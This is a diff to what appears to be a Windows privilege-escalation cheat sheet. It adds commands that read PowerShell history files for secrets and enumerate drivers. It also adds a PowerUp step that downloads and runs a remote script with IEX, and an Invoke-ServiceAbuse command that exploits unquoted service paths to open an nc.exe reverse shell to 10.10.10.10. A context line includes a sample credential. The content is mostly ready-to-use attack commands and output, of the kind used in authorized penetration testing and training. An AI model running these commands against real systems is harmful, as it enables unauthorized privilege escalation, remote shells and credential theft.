@@ -457,6 +457,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ### Powershell history
 
 ```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
@@ -676,7 +677,24 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-Metasploit provides the exploit : `exploit/windows/local/trusted_service_path`
+* Metasploit exploit : `exploit/windows/local/trusted_service_path`
+* PowerUp exploit
+
+    ```powershell
+    # find the vulnerable application
+    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+    ...
+    [*] Checking for unquoted service paths...
+    ServiceName   : BBSvc
+    Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
+    StartName     : LocalSystem
+    AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
+    ...
+
+    # automatic exploit
+    Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+    ```
 
 ### Example
 
@@ -748,8 +766,9 @@ Example: "Windows Help and Support" (Windows + F1), search for "command prompt",
 Look for vuln drivers loaded, we often don't spend enough time looking at this:
 
 ```powershell
-PS C:\Users\Swissky> driverquery.exe /fo table
+# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
 
+PS C:\Users\Swissky> driverquery.exe /fo table
 Module Name  Display Name           Driver Type   Link Date
 ============ ====================== ============= ======================
 1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
@@ -761,6 +780,18 @@ acpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM
 AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM
 acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
 ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
+<SNIP>
+
+PS C:\Users\Swissky> DriverQuery.exe --no-msft
+[+] Enumerating driver services...
+[+] Checking file signatures...
+Citrix USB Filter Driver
+    Service Name: ctxusbm
+    Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
+    Version: 14.11.0.138
+    Creation Time (UTC): 17/05/2018 01:20:50
+    Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
+    Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
 <SNIP>
 ```
 
